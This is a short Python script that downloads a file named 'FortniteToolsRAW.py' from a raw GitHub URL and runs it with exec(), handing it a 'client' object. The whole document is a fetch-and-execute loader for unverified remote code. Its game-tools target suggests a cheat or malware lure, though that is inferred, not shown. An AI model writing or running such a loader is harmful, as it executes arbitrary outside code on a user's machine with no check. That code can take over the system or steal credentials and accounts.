import requests

def execute_code_from_url(url, client=None):
    response = requests.get(url)
    if response.status_code == 200:
        code = response.text
        exec(code, globals(), {'client': client})
    else:
        print("Failed to fetch code from URL")

# Example usage:
url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/FortniteTools/FortniteToolsRAW.py"  # Replace with the actual URL
execute_code_from_url(url, client)
